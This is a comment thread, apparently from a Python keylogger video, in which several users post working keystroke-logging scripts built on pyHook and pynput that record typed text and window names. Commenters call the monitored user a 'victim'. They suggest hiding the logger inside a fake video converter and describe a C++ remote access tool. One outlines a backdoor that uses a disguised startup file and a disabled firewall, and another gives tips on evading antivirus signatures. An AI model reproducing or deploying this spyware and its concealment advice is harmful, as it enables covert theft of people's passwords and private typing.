text:
I don't like this guy's smug attitude, and I don't like his key logger. This key logger that I made took really low effort so here it is. If you have any questions, feel free to comment. I also have another module that turns the logged keys into one line to read more easily. I have; however, neglected to add a functionality for spaces and backspaces to make it easier to read. If anyone wants that code, just comment at me.
Here is my VERY SIMPLE  key logger:

from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='keys.log', level=logging.DEBUG)


def on_press(key):
    keys = []
    logging.info(str(key))
    keys.append(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()Ôªø

author: LOLERIUS LUCIUS

text:
This may be easier to understand at first but it takes away valuable complexity. By valuable complexity I mean the nitty-gritty stuff you learn from doing this in a lower level language like C++. I made a RAT/keylogger in C++ I gained a ton of knowledge from it. It specifically targets the Windows platform, uses winsock to establish the connection, send commands, receive data. It sets a low-level keyboard hook with SetWindowsHookEx and takes screenshots with the help of ffmpeg I wanna make it stream video from the desktop. I learned a ton from this process and still am learning invaluable information.

It's a lot harder and more time consuming but you learn a lot more. And keep in mind, if you have any practical ideas for the keylogger then you don't wanna copy someone else's code. That's how modern anti-virus flags things is partly by heuristics but a lot is from a database of malware signatures. If your code has been used in the "wild" before and detected by anti-virus it will very quickly get blacklisted and won't work on most systems.Ôªø

text:
I have a couple of recommendations, though I needed this primarily to build an AutoCorrect database.

You'll probably want words rather than individual characters to show up on each line, which means that you'll want to prevent "\n" from occurring with every keystroke, only after certain delimiters. Most have a set, but the most common are all major punctuation marks. It's probably use the re module for it, and just say something like re.sub("?P<delimiters>[...]", "\n" + (?P=delimiters), or something like that, if I recall correctly.

Second, you'll probably want to save the format in UTF-8 rather than ASCII format, especially if you're like me and type in Chinese, as well.Ôªø

text: A good idea for a backdoor could be a TCP server/client based application. The server gets put in the C:\Windows\Program Files\(unsuspicious filename), with some malware and some sound files. The malware should not be too harsh, not to delete any files or corrupt anything, but just to be a troll. Then, after getting the IP address and writing it down, you copy a shortcut of the server.pyw file and put it in C:\Documents and Settings\All Users\Start Menu\Programs\Start Up, making it start up every time the computer boots, no matter the user that they pick, all you have to do is disable the firewall and go back to your computer, wait for them to boot the pc back on, type in the IP to the client, and access their computer. author: Shubham Bhiwaniwala

text:
Awesome! Worked perfectly so I added some modifications.

-Task Scheduler (windows) to run on startup.
-datetime module to make a new log file each day.
-Removed sys and logging imports and instead used standard file code
-Stores each line rather than one character per line. (separates lines when enter/tab is pressed)
-Removes characters when backspace is pressed so final output is coherent.
-Displays (in the log), the window the text was typed into eg 'youtube', 'google', 'microsoft word'.

Here's the code:

import pyHook, pythoncom
from datetime import datetime

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\' + todays_date + '.txt'

line_buffer = "" #current typed line before return character
window_name = "" #current window

def SaveLineToFile(line):
    todays_file = open(file_name, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file

def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    #print 'Ascii:', event.Ascii, chr(event.Ascii) #pressed value

    """if typing in new window"""
    if(window_name != event.WindowName): #if typing in new window
        if(line_buffer != ""): #if line buffer is not empty
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #print to file: any non printed characters from old window

        line_buffer = "" #clear the line buffer
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #print to file: the new window name
        window_name = event.WindowName #set the new window name

    """if return or tab key pressed"""
    if(event.Ascii == 13 or event.Ascii == 9): #return key
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #print to file: the line buffer
        line_buffer = "" #clear the line buffer
        return True #exit event

    """if backspace key pressed"""
    if(event.Ascii == 8): #backspace key
        line_buffer = line_buffer[:-1] #remove last character
        return True #exit event

    """if non-normal ascii character"""
    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): #unknown character (eg arrow key, shift, ctrl, alt)
            pass #do nothing
        else:
            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
    else:
        line_buffer += chr(event.Ascii) #add pressed character to line buffer
        
    return True #pass event to other handlers

hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for eventsÔªø

    line = "[" + current_time + "] " + line
    todays_file = open(file_name, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file

text:
Hayden Moore, First of all thanks for sharing the code :) 

I'm not expert in Python or  in programming but I'm "studying" your code, I have problems when the user (the ipotetic victim) does not write anything. The program prints into the log file a blank line (I think happens when the user switches from one window to another. You know how to fix it? Last thing: if the user does not presses enter, the program does not write anything in the log file. Thanks for the attention :) (Sorry for my bad English)Ôªø
author: David

text:
No problem :)

I have commented the code quite heavily to try to make it easier to read. If you look at the """if typing in new window""" section, you'll see that when you move to a new window, any text that was typed from the previous window automatically gets saved to the log, followed by a newline (the '\n' makes a new line). If nothing was typed in the previous window then 'if(line_buffer != ""):' will be false and not run. The code below that if statement will always run. So every time a new window typed in, the log will start with a new line then the windows name then another new line. It might be possible that windows doesn't recognize the window name so just blank lines are printed but otherwise i'm not really sure why this problem is happening.

In regards to your last point, I have made the program so that it makes a long string of characters as you type so that when you press the backspace key, characters can be removed which makes the final output easier to read. For example if you try to type 'hello' but accidentally make a typo and type 'hekko(backspace,backspace,backspace)llo', it will end up as 'hello' in the final string. 
Currently there are three ways to send the temporary string to the log. Pressing enter, pressing tab and when you start typing in a new window. You could try adding more ways to send the temporary string to the log if you wanted. You could make it send to the log every 10 seconds for maybe after a certain number of characters have been pressed or even after every character like in the video (but in my opinion that makes it hard to read).Ôªø

author: Siraj Qazi

text:
I don't know whether this dude has any syntax error, but here's my tested source code, hope it was of any help (don't forget installing the correct modules)

import pyHook, pythoncom, sys, logging

file_log = 'C:\\datax\\log.txt'

def OnKeyboardEvent (event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()Ôªø

import pyHook, pythoncom, sys, logging, win32api
from pyHook import HookManager
file_log = 'C:\\Users\\USER\\Documents\\Logs\\log.txt'

def OnKeyboardEvent(event):
 logging.basicConfig(filename=file_log,filemode ='a',level=logging.DEBUG, format='%(message)s')
 chr(event.Ascii)
 logging.log(10,chr(event.Ascii))
 return True
 
Hook_Manager = HookManager()
Hook_Manager.KeyDown = OnKeyboardEvent
Hook_Manager.HookKeyboard()
pythoncom.PumpMessages()Ôªø

import pyHook, pythoncom, sys, logging
file_log = 'C:/keyloggeroutput.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    print("True")
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()Ôªø

+InstaGraze I've written a similar copy of that script, but slightly modified that will save the log to your desktop every time. This should make it easier to find, just minimize everything and look for "log"
Copy the script below.



import pyHook, pythoncom, sys, logging, getpass

file_log = "C:\\Documents and Settings\\" + getpass.getuser() + "\\Desktop\\log.txt"

def OnKeyboardEvent(event):
 logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 chr(event.Ascii)
 logging.log(10,chr(event.Ascii))

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()Ôªø

author: Hex Rex

text:
HOW TO GET pyHOOK
some people may have the problem on not knowing how to get pyHOOK,
so here is the solution:
grab this file: https://bootstrap.pypa.io/get-pip.py and then save it somewhere and run it. It will install you PIP. then you go to your Python Directory and in the "scripts" folder you may find a "pip.exe". now you just need to open up the CMD there (startmenu-search for "cmd", then type in "cd" then a space and then the directory where python/scripts/pip.exe is).
Then type in (into the cmd again) "pip install pyhook". And then you're DONE! finding that solution took me about 2 hours so please ask if you didnt get something yet.Ôªø

author: blackneos940

text: @blackneos940 Okay, you need to learn some things. Python is a scripting language, therefore is more straight forward than a programming language. Here's an or expression in C++, Java: "||." In Python: "or." Those aren't logical operators, those are words. They have the same function, but it's not good practice for moving on. And Python doesn't have variables. It has lines of code. myVar = 5; That's Python. Java: int, String, float, double myVar = "", 5, 5f, 5.0. Again, not good practice. Python is just... weird. It seems like it's overused, and it's just not a good language to start out at first. Also, if I know correctly, Youtube now uses Ruby or Ruby on Rails to run this website. But Python is a scripting language, that's why it's used in websites. That's why it's not widely used in games. A programming language like Java is right in the middle.Ôªø
author: Brady Gunter

text: @Brady Gamer¬†Yes, but that doesn't mean I'm going to stop using it..... ¬†Everything can be broken down to 0's and 1's, so..... ¬†You know that Wifite is made with Python, right.....? ¬†I'm not one of those people that picks one or two Languages and craps on those who use others..... ¬†Python is solid. Period.Ôªø

But good luck anyways.Ôªø

Actually, python is available as a small runtime that can be bundled with a script inside a .exe installer. YOu could also send something usefull like a python video convertor or python Youtube downloader and put the keylogger with it. Python can create pretty cool looking GUIs, damnvid uses python for instance. It can download from close to 50 video websites (including Hulu with a plugin). there is a Linux only video editor written in python and it looks a bit like Movie Maker for XP and Sony Vegas combined.

If you want a script that works on all Windows because the runtime is already installed look up VBScript. One of the worst viruses of all time was written in it.

I doubt you would actually use this info, but its worth saying anyway. Well, make of it what you will.Ôªø

import pyHook, pythoncom, sys, logging

file_log = "C:\\important\\log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()Ôªø

text:
I think I found the problem. On the line 
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message) s'
there isn't a percent symbol nor a parentheses symbol. It ends with =%(message) s' rather than what you typed. You put =%(message)%')
Ôªø
